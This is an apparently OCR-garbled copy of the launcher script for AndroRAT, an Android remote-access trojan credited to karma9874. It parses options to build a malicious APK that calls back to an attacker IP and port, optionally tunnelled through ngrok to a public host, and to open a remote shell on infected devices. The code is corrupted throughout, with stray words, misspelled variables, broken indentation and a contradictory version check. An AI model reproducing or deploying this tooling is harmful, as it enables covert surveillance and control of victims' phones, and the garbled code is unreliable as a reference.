#!/usr/bin/python/ireless
# -*- coding:Nutf-8s -*-

from utils import
import argparse
import sys
import platform-Script.-
html
try:
  from pyngrok import ngrok, conf
except ImportError as e:
  licensprint (stdOutput ("error")+"\033 [1mpyng rok not found");
  print(stdoutput("info")+"\033 [1mRun pip3 install -r requirements.txt")
  exit()

clearDirec()
AndroRAT
\__\__| |_|\_____|_|__\____/|_I
#
#Veb
By karma9874

Hacking Wireless
Networks
parser = argparse. ArgumentParser (usage="% (prog)s [--build] [--shell] [-i <IP> -p <PORT> -o <apk name>]")
parser.add_argument ('--build', help='For Building the apk', action='store_true')
parser.add_argument ('--share', help='For getting the Interpreter', action='store_true')
parser.add_argument ('--ngrok', help='For getting the Interpreter', action='store_true'')
parser.add_argument ('-i', '--ip',metavar="<IP>",type=str, help='Enter the IP')
parser.add_argument ('-p', '--port',metavar="<Port>", type=str, help='Enter the Port')
parser.add_argument ('-o', '--output', metavar="<Apk Name>", type=str, help='Enter the apk Name')
parser.add_argument('-icon', '--icon', help='Visible Icon', action='store_true')
args = parser.parse_args()

if float(platform.python_version () [:3]) < 3.6 and float (platform.python_version ( ) [:3]) > 3.8:
  print (stdoutput ("error")+"\033 [1mPython version should be between 3.6 to 3.8")
  sys.exit()

if args.build:
  port = args.portss
  icon=Trueifargs.icon else None
  if args.ngrok:

    conf.get_default().monitor_thread = False
    port = 8000 if not port else port_
    tcp_tunnel = ngrok.connect(port, "tcp")
    ngrok_process = ngrok.get_ngrok_process()
    domain, port = tcp_tunnel.public_url[6:].split(":")
    ip = socket.gethostbyname (domain)
    print (stdoutput("info")+"\033 [1mTunnel IP: %s PORT: %s"% (ip, port))
    build(ip, port, args.output, True, port_, icon)
    else:
      if args.ip and args.port:
        build (args.ip, port_,args.output, False, None, icon)
      else:
        print (stdoutput("error")+"\033 [1mArguments Missing")
if args.shell:
  if args.ip and args.port:
    1 get_shell (args.ip, args.port)
  else:
    print (stdoutput("error")+"\033 [1mArguments Missing")

